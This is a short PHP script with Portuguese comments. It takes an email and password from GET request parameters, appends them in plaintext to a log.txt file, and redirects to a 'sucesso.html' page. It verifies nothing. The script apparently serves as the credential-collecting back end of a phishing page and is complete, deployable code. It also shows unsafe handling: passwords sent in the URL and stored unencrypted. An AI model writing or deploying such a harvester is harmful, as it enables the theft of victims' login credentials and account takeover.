<?php
// Verifica se o método de requisição é GET
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    // Obtém os valores do formulário
    $email = $_GET['email'] ?? '';
    $password = $_GET['password'] ?? '';

    // Abre o arquivo log.txt para adicionar (append)
    $handle = fopen("log.txt", "a");

    // Escreve os dados de login e senha no arquivo log.txt
    fwrite($handle, "Login: " . $email . "\r\n");
    fwrite($handle, "Senha: " . $password . "\r\n");
    fwrite($handle, "\r\n"); // Adiciona uma linha em branco no final do log

    // Fecha o arquivo
    fclose($handle);

    // Redireciona para uma página de sucesso (ou para a mesma página, conforme necessário)
    header('Location: sucesso.html'); // Certifique-se de criar essa página ou ajuste conforme necessário
    exit;
}
?>
